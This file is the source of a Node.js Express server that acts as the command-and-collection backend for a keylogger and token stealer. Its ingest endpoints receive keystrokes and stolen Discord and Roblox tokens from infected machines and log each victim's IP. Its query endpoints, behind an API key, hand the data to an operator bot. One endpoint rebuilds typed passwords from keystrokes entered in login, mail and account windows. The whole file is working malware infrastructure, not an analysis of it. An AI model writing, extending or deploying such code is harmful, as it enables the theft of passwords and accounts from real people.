"use strict";

const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

// ---- CONFIG ----
const PORT = process.env.PORT || 3000;
const API_KEY = process.env.API_KEY || "change-me";
const DATA_DIR = process.env.DATA_DIR || "/tmp/agent-data";
const KEYS_FILE = path.join(DATA_DIR, "keys.json");
const TOKENS_FILE = path.join(DATA_DIR, "tokens.json");
const MAX_KEYS = 20000;   // ring buffer for keylog entries
// ----------------

fs.mkdirSync(DATA_DIR, { recursive: true });

function loadJson(file, fallback) {
  try {
    return JSON.parse(fs.readFileSync(file, "utf-8"));
  } catch {
    return fallback;
  }
}

// atomic-ish write: tmp then rename
function saveJson(file, value) {
  const tmp = file + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(value));
  fs.renameSync(tmp, file);
}

let keyEvents = loadJson(KEYS_FILE, []);
let tokens = loadJson(TOKENS_FILE, []);

const app = express();
app.use(cors());
app.use(express.json({ limit: "2mb" }));

// ---------- INGEST (client -> server) ----------
app.post("/ingest/keys", (req, res) => {
  const events = Array.isArray(req.body?.events) ? req.body.events : null;
  if (!events) return res.status(400).json({ ok: false, error: "bad body" });

  for (const e of events) {
    if (!e || typeof e.k !== "string") continue;
    keyEvents.push({
      k: e.k,
      w: typeof e.w === "string" ? e.w : "",
      t: typeof e.t === "number" ? e.t : Date.now() / 1000,
      ip: req.ip,
    });
  }
  if (keyEvents.length > MAX_KEYS) {
    keyEvents = keyEvents.slice(keyEvents.length - MAX_KEYS);
  }
  try { saveJson(KEYS_FILE, keyEvents); } catch {}
  res.json({ ok: true, count: events.length });
});

app.post("/ingest/tokens", (req, res) => {
  const list = Array.isArray(req.body?.tokens) ? req.body.tokens : null;
  if (!list) return res.status(400).json({ ok: false, error: "bad body" });

  for (const tk of list) {
    if (!tk || typeof tk.token !== "string") continue;
    const dup = tokens.find(
      x => x.token === tk.token && x.kind === tk.kind
    );
    if (dup) continue; // dedupe
    tokens.push({
      kind: tk.kind === "roblox" ? "roblox" : "discord",
      token: tk.token,
      source: typeof tk.source === "string" ? tk.source : "",
      ts: typeof tk.ts === "number" ? tk.ts : Date.now() / 1000,
      ip: req.ip,
    });
  }
  try { saveJson(TOKENS_FILE, tokens); } catch {}
  res.json({ ok: true, count: list.length, total: tokens.length });
});

// ---------- AUTH ----------
function requireKey(req, res, next) {
  const key = req.headers["x-api-key"] || req.query.key;
  if (key !== API_KEY) {
    return res.status(401).json({ ok: false, error: "unauthorized" });
  }
  next();
}

// ---------- QUERY (bot -> server) ----------
app.get("/api/keys", requireKey, (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 500, MAX_KEYS);
  const since = parseFloat(req.query.since) || 0;
  const filtered = keyEvents.filter(e => e.t >= since);
  res.json({ ok: true, count: filtered.length, events: filtered.slice(-limit) });
});

app.get("/api/tokens", requireKey, (req, res) => {
  const kind = req.query.kind;
  const filtered = kind ? tokens.filter(t => t.kind === kind) : tokens;
  res.json({ ok: true, count: filtered.length, tokens: filtered });
});

// reconstruct passwords from keylog windows matching "password" keywords
app.get("/api/passwords", requireKey, (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 50, 500);
  const found = [];
  let buf = [];
  for (const e of keyEvents) {
    buf.push(e);
    if (buf.length > 200) buf.shift();
    const combined = buf.map(x => x.k).join("");
    if (/\[ENTER\]/.test(e.k)) {
      const win = (e.w || "").toLowerCase();
      const pwdCtx =
        /password|login|sign in|signin|auth|gmail|mail|account/.test(win);
      if (pwdCtx) {
        // walk back from ENTER to previous [ENTER] or start
        const recent = [];
        for (let i = keyEvents.indexOf(e); i >= 0 && recent.length < 120; i--) {
          recent.unshift(keyEvents[i]);
          if (keyEvents[i].k === "[ENTER]" && recent.length > 1) break;
        }
        const text = recent.map(x => x.k).join("").replace(/\[ENTER\]$/, "");
        if (text.trim()) {
          found.push({
            window: e.w || "",
            site: (e.w || "").split(/[-–—|]/)[0].trim() || "unknown",
            entry: text.trim().slice(-200),
            ts: e.t,
          });
        }
      }
    }
  }
  res.json({ ok: true, count: found.length, passwords: found.slice(-limit) });
});

// ---------- HEALTH ----------
app.get("/", (req, res) => {
  res.json({
    ok: true,
    keys: keyEvents.length,
    tokens: tokens.length,
    uptime: process.uptime(),
  });
});

app.listen(PORT, () => {
  console.log(`host up on :${PORT}, data dir ${DATA_DIR}`);
});
